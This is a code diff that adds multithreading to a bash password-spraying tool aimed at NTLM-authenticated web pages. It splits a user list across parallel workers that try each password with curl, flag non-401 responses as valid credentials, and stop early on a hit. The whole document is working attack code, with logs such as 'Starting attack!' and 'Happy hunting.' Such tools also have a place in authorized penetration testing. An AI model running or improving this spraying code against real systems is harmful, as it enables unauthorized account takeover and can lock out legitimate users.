@@ -5,6 +5,9 @@ EXITSUCCESS="FALSE"
 RATE=1
 WAITTIME=0
 VERBOSE="FALSE"
+THREADS="1"
+TEMPDIR=$(mktemp -d)
+FIN=".success"
 #DOMAIN="FALSE"
 #PASSFILE="FALSE"
 #USERFILE="FALSE"
@@ -54,11 +57,12 @@ function print_usage {
     echo -e "\t-p,--pass   <path>   - path to file of passwords"
     echo -e "\t-l,--url    <url>    - URL to NTLM authenticated page"
     echo -e "Options:"
-    echo -e "\t-r,--rate   <time>   - Rate of each attempt in seconds"
-    echo -e "\t-w,--wait   <time>   - Seconds between sprays"
-    echo -e "\t-s,--stop-on-success - Stops when valid creds are found"
-    echo -e "\t-h,--help            - Print full help"
-    echo -e "\t-v,--verbose         - Print verbose information"
+    echo -e "\t-t,--threads <num>    - Number of threads to use"
+    echo -e "\t-r,--rate    <time>   - Rate of each attempt in seconds"
+    echo -e "\t-w,--wait    <time>   - Seconds between sprays"
+    echo -e "\t-s,--stop-on-success  - Stops when valid creds are found"
+    echo -e "\t-h,--help             - Print full help"
+    echo -e "\t-v,--verbose          - Print verbose information"
     exit 1
 }
 
@@ -114,8 +118,49 @@ if [ $statuscode == "200" ] || [ $statuscode == "302" ] || [ $statuscode == "404
 fi
 }
 
+# Splits an input file ($1) into N ($2) chunks and output to directory ($3)
+function split_input_file {
+    # Quick sanity check
+    if [ $# -lt 3 ] ; then
+        log_error "Incorrect parameters to split files."
+        exit 1
+    fi
+    split $1 -n l/$2 $3/u
+}
+
 function print_settings {
     echo "TODO print current config..."
+}
+
+function skunk_spray {
+        if [ -a $TEMPDIR/$FIN ] ; then
+            log_info "Already got a hit! Thread Exiting..."
+            exit 0
+        fi
+        for user in $(cat $1) ; do
+            tmp=$(curl -s -k -I --ntlm -u "$DOMAIN\\"$user":$password" $URL -o /dev/null -w '%{http_code},%{size_download},%{time_total}') 1>/dev/null
+            statuscode=$(echo $tmp | cut -d ',' -f 1)
+            downsize=$(echo $tmp | cut -d ',' -f 2)
+            totaltime=$(echo $tmp | cut -d ',' -f 3)
+            if [ $statuscode -ne "401" ]; then 
+                log_success "$DOMAIN\\\\$user:$password - SUCCESS $statuscode"
+                if [ $EXITSUCCESS == "TRUE" ] ; then
+                    if [ $VERBOSE == "TRUE" ] ; then
+                        log_info "Response Size: $downsize"
+                        log_info "Response Time: $totaltime"
+                    fi
+                    log_success "$DOMAIN\\\\$user:$password - SUCCESS $statuscode" >> $TEMPDIR/$FIN
+                    exit 0
+                fi
+            else 
+                log_error "$DOMAIN\\\\$user:$password - failed $statuscode"
+            fi
+            if [ $VERBOSE == "TRUE" ] ; then
+                log_info "Response Size: $downsize"
+                log_info "Response Time: $totaltime"
+            fi
+            sleep $RATE
+    done
 }
 
 ## Set traps
@@ -146,6 +191,11 @@ case $key in
     ;;
     -l|--url)
     URL="$2"
+    shift # past argument
+    shift # past value
+    ;;
+    -t|--threads)
+    THREADS="$2"
     shift # past argument
     shift # past value
     ;;
@@ -182,47 +232,54 @@ set -- "${ARGS[@]}" # restore positional parameters
 check_args
 check_endpoint
 
+
 if [ $VERBOSE == "TRUE" ] ; then
     print_settings
+fi
+
+if [ $THREADS -gt 20 ] ; then
+    log_warning "Warning: 20+ threads could be risky!"
+fi
+
+if [ $THREADS -gt 100 ] ; then
+    log_error "Too many threads!"
+    exit 1
 fi
 
 proceed=y
 if [ $proceed == 'y' ] ; then 
     log_info "Starting attack!"
+    if [ $THREADS -eq 0 ]; then
+        log_error "Cannot have 0 threads!"
+        exit 1
+    fi
+    if [ $VERBOSE == "TRUE" ] ; then
+        log_info "Running with $THREADS threads..."
+    fi
+    split_input_file $USERFILE $THREADS $TEMPDIR
     for password in $(cat $PASSFILE) ; do
         log_info "Spraying password: \"$password\""
-        for user in $(cat $USERFILE) ; do
-            tmp=$(curl -s -k -I --ntlm -u "$DOMAIN\\"$user":$password" $URL -o /dev/null -w '%{http_code},%{size_download},%{time_total}') 1>/dev/null
-            statuscode=$(echo $tmp | cut -d ',' -f 1)
-            downsize=$(echo $tmp | cut -d ',' -f 2)
-            totaltime=$(echo $tmp | cut -d ',' -f 3)
-            if [ $statuscode -ne "401" ]; then 
-                log_success "$DOMAIN\\\\$user:$password - SUCCESS $statuscode"
-                if [ $EXITSUCCESS == "TRUE" ] ; then
-                    if [ $VERBOSE == "TRUE" ] ; then
-                        log_info "Response Size: $downsize"
-                        log_info "Response Time: $totaltime"
-                    fi
-                    log_success "Happy hunting."
-                    exit 0
-                fi
-            else 
-                log_error "$DOMAIN\\\\$user:$password - failed $statuscode"
-            fi
+        for file in $(ls $TEMPDIR) ; do
             if [ $VERBOSE == "TRUE" ] ; then
-                log_info "Response Size: $downsize"
-                log_info "Response Time: $totaltime"
+                log_info "Spawning child: $file"
             fi
-            sleep $RATE
+            skunk_spray $TEMPDIR/$file &
         done
+        if [ $VERBOSE == "TRUE" ] ; then
+            log_info "Waiting for threads to exit..."
+        fi
+        wait
+        if [ -a $TEMPDIR/$FIN ] ; then
+            cat $TEMPDIR/$FIN
+            log_success "Happy hunting."
+            rm $TEMPDIR/$FIN
+            exit 0
+        fi
         log_info "Attempt of \"$password\" completed."
         log_info "Sleeping for $WAITTIME seconds..."
         sleep $WAITTIME
     done
 fi
 log_info "Attack Complete."
-
-
-
-
+rm $TEMPDIR/$FIN
 
